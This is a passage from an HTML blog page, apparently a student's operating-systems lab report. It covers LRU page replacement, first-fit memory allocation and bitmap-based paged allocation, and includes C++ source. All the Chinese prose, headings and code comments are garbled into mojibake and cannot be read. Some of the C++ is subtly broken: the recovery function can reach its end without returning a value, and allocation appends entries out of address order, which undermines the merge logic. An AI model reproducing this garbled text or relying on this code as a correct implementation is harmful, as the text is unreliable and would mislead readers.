ä¸ºä¸é€šå¸¸é¡µé¢çš„ä½¿ç”¨è§„åˆ™ä¸ç¬¦åˆï¼Œæ‰€ä»¥å®é™…åº”ç”¨å°‘</li></ul></li><li><p>OPTï¼ˆæœ€ä½³ç½®æ¢ï¼‰ï¼š</p><ul><li><p>ç¼ºç‚¹ï¼šæœ€ä½³ç½®æ¢ç®—æ³•æ˜¯ä¸€ç§ç†æƒ³åŒ–ç®—æ³•ï¼Œå…·æœ‰è¾ƒå¥½çš„æ€§èƒ½ï¼Œä½†æ˜¯å®é™…ä¸Šæ— æ³•å®ç°ï¼ˆæ— æ³•é¢„çŸ¥ä¸€ä¸ªè¿›ç¨‹ä¸­çš„è‹¥å¹²é¡µé¢å“ªä¸€ä¸ªæœ€é•¿æ—¶é—´ä¸è¢«è®¿é—®ï¼‰ï¼›</p></li><li><p>ä¼˜ç‚¹ï¼šæœ€ä½³ç½®æ¢ç®—æ³•å¯ä»¥ä¿è¯è·å¾—æœ€ä½çš„ç¼ºé¡µç‡</p></li></ul></li></ul><h3 id="äº”-å®éªŒæ€»ç»“"><a class="markdownIt-Anchor" href="#äº”-å®éªŒæ€»ç»“"></a> äº”ã€å®éªŒæ€»ç»“</h3><p>LRUç®—æ³•æœ¬èº«æ¯”è¾ƒç®€å•ï¼Œå…³é”®åœ¨äºæ—¶é—´å¤æ‚åº¦çš„æ§åˆ¶ï¼Œä½¿å…¶èƒ½å¤Ÿé«˜æ•ˆå®ç°ï¼Œå“ˆå¸Œè¡¨å¯ä»¥åœ¨O(1)æ—¶é—´å†…æŸ¥æ‰¾ï¼ŒåŒå‘é“¾è¡¨å¯ä»¥åœ¨O(1)æ—¶é—´å†…æ’å…¥å’Œåˆ é™¤ï¼Œæ‰€ä»¥ä¸¤è€…ç»“åˆå¯ä»¥é«˜æ•ˆçš„å®ç°LRUï¼Œæœ¬æ¬¡å®éªŒè¿‡ç¨‹æ˜¯æˆ‘é‡æ–°å›é¡¾äº†listå’Œmapçš„ç”¨æ³•ï¼Œç»“åˆè¿™ä¸¤è€…ï¼ŒæˆåŠŸå®Œæˆäº†å®éªŒã€‚</p><h1 id="å®éªŒ2ä¸»å­˜å‚¨å™¨ç©ºé—´çš„åˆ†é…å’Œå›æ”¶"><a class="markdownIt-Anchor" href="#å®éªŒ2ä¸»å­˜å‚¨å™¨ç©ºé—´çš„åˆ†é…å’Œå›æ”¶"></a> å®éªŒ2ï¼šä¸»å­˜å‚¨å™¨ç©ºé—´çš„åˆ†é…å’Œå›æ”¶</h1><h2 id="ä¸€-å®éªŒå†…å®¹-2"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒå†…å®¹-2"></a> ä¸€ã€å®éªŒå†…å®¹</h2><ul><li>ä¸»å­˜å‚¨å™¨ç©ºé—´çš„åˆ†é…å’Œå›æ”¶</li></ul><h2 id="äºŒ-å®éªŒç›®çš„-2"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒç›®çš„-2"></a> äºŒã€å®éªŒç›®çš„</h2><ul><li>é€šè¿‡æœ¬å®éªŒå¸®åŠ©å­¦ç”Ÿç†è§£åœ¨ä¸åŒçš„å­˜å‚¨ç®¡ç†æ–¹å¼ä¸‹åº”æ€æ ·å®ç°ä¸»å­˜ç©ºé—´çš„åˆ†é…å’Œå›æ”¶</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®-2"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®-2"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><p>æœ¬å®éªŒæ¨¡æ‹Ÿåœ¨ä¸¤ç§å­˜å‚¨ç®¡ç†æ–¹å¼ä¸‹çš„ä¸»å­˜åˆ†é…å’Œå›æ”¶ã€‚</p><h3 id="ç¬¬ä¸€é¢˜"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€é¢˜"></a> ç¬¬ä¸€é¢˜ï¼š</h3><p>åœ¨å¯å˜åˆ†åŒºç®¡ç†æ–¹å¼ä¸‹é‡‡ç”¨<strong>æœ€å…ˆé€‚åº”ç®—æ³•</strong>å®ç°ä¸»å­˜åˆ†é…å’Œå®ç°ä¸»å­˜å›æ”¶ã€‚</p><p>[æç¤º]ï¼š</p><ol><li><p>å¯å˜åˆ†åŒºæ–¹å¼æ˜¯æŒ‰ä½œä¸šéœ€è¦çš„ä¸»å­˜ç©ºé—´å¤§å°æ¥åˆ†å‰²åˆ†åŒºçš„ã€‚å½“è¦è£…å…¥ä¸€ä¸ªä½œä¸šæ—¶ï¼Œæ ¹æ®ä½œä¸šéœ€è¦çš„ä¸»å­˜é‡æŸ¥çœ‹æ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—²ç©ºé—´ï¼Œè‹¥æœ‰ï¼Œåˆ™æŒ‰éœ€è¦é‡åˆ†å‰²ä¸€ä¸ªåˆ†åŒºåˆ†é…ç»™è¯¥ä½œä¸šï¼›è‹¥æ— ï¼Œåˆ™ä½œä¸šä¸èƒ½è£…å…¥ã€‚éšç€ä½œä¸šçš„è£…å…¥ã€æ’¤ç¦»ï¼Œä¸»å­˜ç©ºé—´è¢«åˆ†æˆè®¸å¤šä¸ªåˆ†åŒºï¼Œæœ‰çš„åˆ†åŒºè¢«ä½œä¸šå ç”¨ï¼Œè€Œæœ‰çš„åˆ†åŒºæ˜¯ç©ºé—²çš„ã€‚ä¾‹å¦‚ï¼š</p><p><img src="/posts/6c024da0/image-20211213172512213.png" alt="image-20211213172512213"></p><p>ä¸ºäº†è¯´æ˜å“ªäº›åŒºæ˜¯ç©ºé—²çš„ï¼Œå¯ä»¥ç”¨æ¥è£…å…¥æ–°ä½œä¸šï¼Œå¿…é¡»è¦æœ‰ä¸€å¼ ç©ºé—²åŒºè¯´æ˜è¡¨ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="/posts/6c024da0/image-20211213172536343.png" alt="image-20211213172536343"></p></li><li><p>å½“æœ‰ä¸€ä¸ªæ–°ä½œä¸šè¦æ±‚è£…å…¥ä¸»å­˜æ—¶ï¼Œå¿…é¡»æŸ¥ç©ºé—²åŒºè¯´æ˜è¡¨ï¼Œä»ä¸­æ‰¾å‡ºä¸€ä¸ªè¶³å¤Ÿå¤§çš„ç©ºé—²åŒºã€‚æœ‰æ—¶æ‰¾åˆ°çš„ç©ºé—²åŒºå¯èƒ½å¤§äºä½œä¸šéœ€è¦é‡ï¼Œè¿™æ—¶åº”æŠŠåŸæ¥çš„ç©ºé—²åŒºå˜æˆä¸¤éƒ¨åˆ†ï¼šä¸€éƒ¨åˆ†åˆ†ç»™ä½œä¸šå ç”¨ï¼›å¦ä¸€éƒ¨åˆ†åˆæˆä¸ºä¸€ä¸ªè¾ƒå°çš„ç©ºé—²åŒºã€‚ä¸ºäº†å°½é‡å‡å°‘ç”±äºåˆ†å‰²é€ æˆçš„ç©ºé—²åŒºï¼Œè€Œå°½é‡ä¿å­˜é«˜åœ°å€éƒ¨åˆ†æœ‰è¾ƒå¤§çš„è¿ç»­ç©ºé—²åŒºåŸŸï¼Œä»¥åˆ©äºå¤§å‹ä½œä¸šçš„è£…å…¥ã€‚ä¸ºæ­¤ï¼Œåœ¨ç©ºé—²åŒºè¯´æ˜è¡¨ä¸­ï¼ŒæŠŠæ¯ä¸ªç©ºé—²åŒºæŒ‰å…¶åœ°å€é¡ºåºç™»è®°ï¼Œå³æ¯ä¸ªåç»§çš„ç©ºé—²åŒºå…¶èµ·å§‹åœ°å€æ€»æ˜¯æ¯”å‰è€…å¤§ã€‚ä¸ºäº†æ–¹ä¾¿æŸ¥æ‰¾è¿˜å¯ä½¿è¡¨æ ¼â€œç´§ç¼©â€ï¼Œæ€»æ˜¯è®©â€œç©ºè¡¨ç›®â€æ é›†ä¸­åœ¨è¡¨æ ¼çš„åéƒ¨ã€‚</p></li><li><p>é‡‡ç”¨æœ€å…ˆé€‚åº”ç®—æ³•ï¼ˆé¡ºåºåˆ†é…ç®—æ³•ï¼‰åˆ†é…ä¸»å­˜ç©ºé—´ã€‚æŒ‰ç…§ä½œä¸šçš„éœ€è¦é‡ï¼ŒæŸ¥ç©ºé—²åŒºè¯´æ˜è¡¨ï¼Œé¡ºåºæŸ¥çœ‹ç™»è®°æ ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªèƒ½æ»¡è¶³è¦æ±‚çš„ç©ºé—²åŒºã€‚å½“ç©ºé—²åŒºå¤§äºéœ€è¦é‡æ—¶ï¼Œä¸€éƒ¨åˆ†ç”¨æ¥è£…å…¥ä½œä¸šï¼Œå¦ä¸€éƒ¨åˆ†ä»ä¸ºç©ºé—²åŒºç™»è®°åœ¨ç©ºé—²åŒºè¯´æ˜è¡¨ä¸­ã€‚ç”±äºæœ¬å®éªŒæ˜¯æ¨¡æ‹Ÿä¸»å­˜çš„åˆ†é…ï¼Œæ‰€ä»¥æŠŠä¸»å­˜åŒºåˆ†é…ç»™ä½œä¸šåå¹¶ä¸å®é™…å¯åŠ¨è£…å…¥ç¨‹åºè£…å…¥ä½œä¸šï¼Œè€Œç”¨è¾“å‡ºâ€œåˆ†é…æƒ…å†µâ€æ¥ä»£æ›¿ã€‚æœ€å…ˆé€‚åº”åˆ†é…ç®—æ³•å¦‚å›¾ã€‚</p><p><img src="/posts/6c024da0/image-20211213172909092.png" alt="image-20211213172909092"></p></li><li><p>å½“ä¸€ä¸ªä½œä¸šæ‰§è¡Œç»“æŸæ’¤ç¦»æ—¶ï¼Œä½œä¸šæ‰€å çš„åŒºåŸŸåº”è¯¥å½’è¿˜ï¼Œå½’è¿˜çš„åŒºåŸŸå¦‚æœä¸å…¶å®ƒç©ºé—²åŒºç›¸é‚»ï¼Œåˆ™åº”åˆæˆä¸€ä¸ªè¾ƒå¤§çš„ç©ºé—²åŒºï¼Œç™»è®°åœ¨ç©ºé—²åŒºè¯´æ˜è¡¨ä¸­ã€‚ä¾‹å¦‚ï¼Œåœ¨æç¤º(1)ä¸­åˆ—ä¸¾çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä½œä¸š2æ’¤ç¦»ï¼Œå½’è¿˜æ‰€å ä¸»å­˜åŒºåŸŸæ—¶ï¼Œåº”ä¸ä¸Šã€ä¸‹ç›¸é‚»çš„ç©ºé—²åŒºä¸€èµ·åˆæˆä¸€ä¸ªå¤§çš„ç©ºé—²åŒºç™»è®°åœ¨ç©ºé—²åŒºè¯´æ˜è¡¨ä¸­ã€‚å½’è¿˜ä¸»å­˜æ—¶çš„å›æ”¶ç®—æ³•å¦‚å›¾ã€‚</p><p><img src="/posts/6c024da0/image-20211213172948727.png" alt="image-20211213172948727"></p></li><li><p>è¯·æŒ‰æœ€å…ˆé€‚åº”ç®—æ³•è®¾è®¡ä¸»å­˜åˆ†é…å’Œå›æ”¶çš„ç¨‹åºã€‚ç„¶åæŒ‰ï¼ˆ1ï¼‰ä¸­å‡è®¾ä¸»å­˜ä¸­å·²è£…å…¥ä¸‰ä¸ªä½œä¸šï¼Œä¸”å½¢æˆä¸¤ä¸ªç©ºé—²åŒºï¼Œç¡®å®šç©ºé—²åŒºè¯´æ˜è¡¨çš„åˆå€¼ã€‚ç°æœ‰ä¸€ä¸ªéœ€è¦ä¸»å­˜é‡ä¸º6Kçš„ä½œä¸š4ç”³è¯·è£…å…¥ä¸»å­˜ï¼›ç„¶åä½œä¸š3æ’¤ç¦»ï¼›å†ä½œä¸š2æ’¤ç¦»ã€‚è¯·ä½ ä¸ºå®ƒä»¬è¿›è¡Œä¸»å­˜åˆ†é…å’Œå›æ”¶ï¼ŒæŠŠç©ºé—²åŒºè¯´æ˜è¡¨çš„åˆå€¼ä»¥åŠæ¯æ¬¡åˆ†é…æˆ–å›æ”¶åçš„å˜åŒ–æ˜¾ç¤ºå‡ºæ¥æˆ–æ‰“å°å‡ºæ¥ã€‚</p></li></ol><h3 id="ç¬¬äºŒé¢˜"><a class="markdownIt-Anchor" href="#ç¬¬äºŒé¢˜"></a> ç¬¬äºŒé¢˜ï¼š</h3><p><strong>åœ¨åˆ†é¡µå¼ç®¡ç†æ–¹å¼ä¸‹é‡‡ç”¨ä½ç¤ºå›¾æ¥è¡¨ç¤ºä¸»å­˜åˆ†é…æƒ…å†µï¼Œå®ç°ä¸»å­˜ç©ºé—´çš„åˆ†é…å’Œå›æ”¶ã€‚</strong></p><p>[æç¤º]ï¼š</p><ol><li><p>åˆ†é¡µå¼å­˜å‚¨å™¨æŠŠä¸»å­˜åˆ†æˆå¤§å°ç›¸ç­‰çš„è‹¥å¹²å—ï¼Œä½œä¸šçš„ä¿¡æ¯ä¹ŸæŒ‰å—çš„å¤§å°åˆ†é¡µï¼Œä½œä¸šè£…å…¥ä¸»å­˜æ—¶å¯æŠŠä½œä¸šçš„ä¿¡æ¯æŒ‰é¡µåˆ†æ•£å­˜æ”¾åœ¨ä¸»å­˜çš„ç©ºé—²å—ä¸­ï¼Œä¸ºäº†è¯´æ˜ä¸»å­˜ä¸­å“ªäº›å—å·²ç»è¢«å ç”¨ï¼Œå“ªäº›å—æ˜¯å°šæœªåˆ†é…çš„ç©ºé—²å—ï¼Œå¯ç”¨ä¸€å¼ ä½ç¤ºå›¾æ¥æŒ‡å‡ºã€‚ä½ç¤ºå›¾å¯ç”±è‹¥å¹²å­˜å‚¨å•å…ƒæ¥æ„æˆï¼Œå…¶ä¸­æ¯ä¸€ä½ä¸ä¸€ä¸ªç‰©ç†å—å¯¹åº”ï¼Œç”¨0/1è¡¨ç¤ºå¯¹åº”å—ä¸ºç©ºé—²/å·²å ç”¨ã€‚</p></li><li><p>å‡è®¾æŸç³»ç»Ÿçš„ä¸»å­˜è¢«åˆ†æˆå¤§å°ç›¸ç­‰çš„64å—ï¼Œåˆ™ä½ç¤ºå›¾å¯ç”¨8ä¸ªå­—èŠ‚æ¥æ„æˆï¼Œå¦ç”¨ä¸€å•å…ƒè®°å½•å½“å‰ç©ºé—²å—æ•°ã€‚å¦‚æœå·²æœ‰ç¬¬0ï¼Œ1ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ9ï¼Œ11ï¼Œ13ï¼Œ24ï¼Œ31ï¼Œå…±10ä¸ªä¸»å­˜å—è¢«å ç”¨äº†ï¼Œé‚£ä¹ˆä½ç¤ºå›¾æƒ…å†µå¦‚ä¸‹</p><p><img src="/posts/6c024da0/image-20211213173805545.png" alt="image-20211213173805545"></p></li><li><p>å½“è¦è£…å…¥ä¸€ä¸ªä½œä¸šæ—¶ï¼Œæ ¹æ®ä½œä¸šå¯¹ä¸»å­˜çš„éœ€è¦é‡ï¼Œå…ˆæŸ¥å½“å‰ç©ºé—²å—æ•°æ˜¯å¦èƒ½æ»¡è¶³ä½œä¸šè¦æ±‚ï¼Œè‹¥ä¸èƒ½æ»¡è¶³åˆ™è¾“å‡ºåˆ†é…ä¸æˆåŠŸã€‚è‹¥èƒ½æ»¡è¶³ï¼Œåˆ™æŸ¥ä½ç¤ºå›¾ï¼Œæ‰¾å‡ºä¸ºâ€œ0â€çš„ä¸€äº›ä½ï¼Œç½®ä¸Šå ç”¨æ ‡å¿—â€œ1â€ï¼Œä»â€œå½“å‰ç©ºé—²å—æ•°â€ä¸­å‡å»æœ¬æ¬¡å ç”¨å—æ•°ã€‚æŒ‰æ‰¾åˆ°çš„è®¡ç®—å‡ºå¯¹åº”çš„å—å·ï¼Œå…¶è®¡ç®—å…¬å¼ä¸ºï¼šå—å·=j 8+Iå…¶ä¸­ï¼Œjè¡¨ç¤ºæ‰¾åˆ°çš„æ˜¯ç¬¬nä¸ªå­—èŠ‚ï¼Œiè¡¨ç¤ºå¯¹åº”çš„æ˜¯ç¬¬nä½ã€‚æ ¹æ®åˆ†é…ç»™ä½œä¸šçš„å—å·ï¼Œä¸ºä½œä¸šå»ºç«‹ä¸€å¼ é¡µè¡¨ï¼Œé¡µè¡¨<br>æ ¼å¼ï¼š</p><p><img src="/posts/6c024da0/image-20211213173822803.png" alt="image-20211213173822803"></p></li><li><p>å½“ä¸€ä¸ªä½œä¸šæ‰§è¡Œç»“æŸï¼Œå½’è¿˜ä¸»å­˜æ—¶ï¼Œæ ¹æ®è¯¥ä½œä¸šçš„é¡µè¡¨å¯ä»¥çŸ¥é“åº”å½’è¿˜çš„å—å·ï¼Œç”±å—å·å¯è®¡ç®—å‡ºåœ¨ä½ç¤ºå›¾ä¸­çš„å¯¹åº”ä½ç½®ï¼ŒæŠŠå¯¹åº”ä½çš„å ç”¨æ ‡å¿—æ¸…æˆâ€œ0â€ï¼Œè¡¨ç¤ºå¯¹åº”çš„å—å·²æˆä¸ºç©ºé—²å—ã€‚å½’è¿˜çš„å—æ•°åŠ å…¥åˆ°å½“å‰ç©ºé—²å—æ•°ä¸­ã€‚ç”±å—å·è®¡ç®—åœ¨ä½ç¤ºå›¾ä¸­çš„ä½ç½®çš„å…¬å¼å¦‚ä¸‹ï¼šå­—èŠ‚å· j=[å—å·/8] ï¼ˆ[ ]è¡¨ç¤ºå–æ•´ï¼‰ä½æ•° i={å—å·/8} ï¼ˆ{ }è¡¨ç¤ºå–ä½™ï¼‰</p></li><li><p>è®¾è®¡å®ç°ä¸»å­˜åˆ†é…å’Œå›æ”¶çš„ç¨‹åºã€‚å‡å®šä½ç¤ºå›¾çš„åˆå§‹çŠ¶æ€å¦‚ï¼ˆ2ï¼‰æ‰€è¿°ï¼Œç°æœ‰ä¸€ä¿¡æ¯é‡ä¸º5é¡µçš„ä½œä¸šè¦è£…å…¥ï¼Œè¿è¡Œä½ æ‰€è®¾è®¡çš„åˆ†é…ç¨‹åºï¼Œä¸ºä½œä¸šåˆ†é…ä¸»å­˜ä¸”å»ºç«‹é¡µè¡¨ï¼ˆæ ¼å¼å¦‚ï¼ˆ3ï¼‰æ‰€è¿°ï¼‰ã€‚ç„¶åå‡å®šæœ‰å¦ä¸€ä½œä¸šæ‰§è¡Œç»“æŸï¼Œå®ƒå ç”¨çš„å—å·ä¸ºç¬¬4ï¼Œ5ï¼Œ6å’Œ31å—ï¼Œè¿è¡Œä½ æ‰€è®¾è®¡çš„å›æ”¶ç¨‹åºï¼Œæ”¶å›ä½œä¸šå½’è¿˜çš„ä¸»å­˜å—ã€‚è¦æ±‚èƒ½æ˜¾ç¤ºå’Œæ‰“å°åˆ†é…æˆ–å›æ”¶å‰åçš„ä½ç¤ºå›¾å’Œå½“å‰ç©ºé—²<br>å—æ•°ï¼Œå¯¹å®Œæˆä¸€æ¬¡åˆ†é…åè¿˜è¦æ˜¾ç¤ºæˆ–æ‰“å°ä¸ºä½œä¸šå»ºç«‹çš„é¡µè¡¨</p></li></ol><h3 id="æ€è€ƒé¢˜-2"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜-2"></a> æ€è€ƒé¢˜ï¼š</h3><p>ç»“åˆå®é™…æƒ…å†µï¼Œå‚è€ƒä¹¦æœ¬ï¼Œä»”ç»†è€ƒè™‘å„ç§ä¸»å­˜åˆ†é…ç®—æ³•çš„ä¼˜ç¼ºç‚¹ã€‚æŠŠä¸»å­˜åˆ†æˆå¤§å°ç›¸ç­‰çš„è‹¥å¹²å—ï¼Œä½œä¸šçš„ä¿¡æ¯ä¹ŸæŒ‰å—çš„å¤§å°åˆ†é¡µï¼Œä½œä¸šè£…å…¥ä¸»å­˜æ—¶æŠŠä½œä¸šçš„ä¿¡æ¯æŒ‰é¡µåˆ†æ•£å­˜æ”¾åœ¨ä¸»å­˜çš„ç©ºé—²å—ä¸­ï¼Œè¿™æ ·å¾ˆå¯èƒ½å¯¼è‡´æ¯ä¸ªä½œä¸šæŒ‰é¡µè£…å…¥ä¸»å­˜ä¸­æ—¶ï¼ŒæŸä¸€é¡µè¿˜å­˜åœ¨ä¸€å®šçš„ç©ºé—²ç©ºé—´ï¼Œæ€è€ƒå¦‚ä½•æ‰èƒ½æœ‰æ•ˆçš„åˆ©ç”¨è¿™äº›ç©ºé—²åŒºåŸŸã€‚</p><h2 id="å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹-2"></a> å››ã€å®éªŒè®¾è®¡ä¸è¿‡ç¨‹</h2><h3 id="ç¬¬ä¸€é¢˜æœ€å…ˆé€‚åº”"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€é¢˜æœ€å…ˆé€‚åº”"></a> ç¬¬ä¸€é¢˜ï¼šæœ€å…ˆé€‚åº”</h3><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-2"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜-2"></a> æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">table</span></span><br><span class="hljs-class">&#123;</span><br>    string name; <span class="hljs-comment">//ä¸»å­˜åˆ†é…ä¿¡æ¯</span><br>    <span class="hljs-keyword">int</span> address; <span class="hljs-comment">//ä¸»å­˜èµ·å§‹åœ°å€</span><br>    <span class="hljs-keyword">int</span> length;  <span class="hljs-comment">//ä¸»å­˜åˆ†é…é•¿åº¦</span><br>    <span class="hljs-keyword">int</span> state;   <span class="hljs-comment">//ä¸»å­˜çŠ¶æ€ä¿¡æ¯ï¼Œ1ä¸ºå·²åˆ†é…ï¼Œ0ä¸ºæœªåˆ†é…</span><br>&#125;;<br>vector&lt;table&gt; alloc_table;   <span class="hljs-comment">//ä¸»å­˜è¡¨</span><br></code></pre></div></td></tr></table></figure><h4 id="å‡½æ•°è¯´æ˜-2"><a class="markdownIt-Anchor" href="#å‡½æ•°è¯´æ˜-2"></a> å‡½æ•°è¯´æ˜</h4><p>ä¸€å…±ä¸‰ä¸ªä¸»è¦å‡½æ•°</p><ul><li>æœªåˆ†é…ä¸»å­˜çš„åˆå¹¶å‡½æ•°</li><li>ä¸»å­˜å›æ”¶å‡½æ•°</li><li>ä¸»å­˜åˆ†é…å‡½æ•°</li></ul><p>æ ¹æ®æµç¨‹å›¾ï¼Œå‡½æ•°æ€è·¯å‡å¾ˆæ¸…æ™°ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">()</span> <span class="hljs-comment">//æœªåˆ†é…ä¸»å­˜çš„åˆå¹¶å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].address + alloc_table[i].length == alloc_table[i + <span class="hljs-number">1</span>].address &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span> &amp;&amp; alloc_table[i + <span class="hljs-number">1</span>].state == <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">//ç›¸é‚»åˆ™åˆå¹¶ï¼Œå¹¶åˆ æ‰åè€…</span><br>            alloc_table[i].length += alloc_table[i + <span class="hljs-number">1</span>].length;<br>            alloc_table.<span class="hljs-built_in">erase</span>(alloc_table.<span class="hljs-built_in">begin</span>() + i + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recovery</span><span class="hljs-params">(string name)</span> <span class="hljs-comment">//ä¸»å­˜å›æ”¶å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (alloc_table[i].name == name)<br>        &#123;<br>            alloc_table[i].name = <span class="hljs-string">&quot;æœªåˆ†é…&quot;</span>;<br>            alloc_table[i].state = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">return</span> alloc_table[i].length;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocation</span><span class="hljs-params">(string name, <span class="hljs-keyword">int</span> length)</span> <span class="hljs-comment">//ä¸»å­˜åˆ†é…å‡½æ•°</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; alloc_table.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (alloc_table[i].length &gt; length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//å‰©ä½™ç©ºé—´æ¯”éœ€æ±‚å¤§</span><br>        &#123;<br>            table t;<br>            t.name = name;<br>            t.address = alloc_table[i].address;<br>            t.length = length;<br>            t.state = <span class="hljs-number">1</span>;<br>            alloc_table.<span class="hljs-built_in">push_back</span>(t);<br><br>            alloc_table[i].address += length;<br>            alloc_table[i].length -= length;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (alloc_table[i].length == length &amp;&amp; alloc_table[i].state == <span class="hljs-number">0</span>) <span class="hljs-comment">//å‰©ä½™ç©ºé—´å’Œéœ€æ±‚ä¸€æ ·</span><br>        &#123;<br>            alloc_table[i].name = name;<br>            alloc_table[i].state = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="å®Œæ•´æºä»£ç -2"><a class="markdownIt-Anchor" href="#å®Œæ•´æºä»£ç -2"></a> å®Œæ•´æºä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 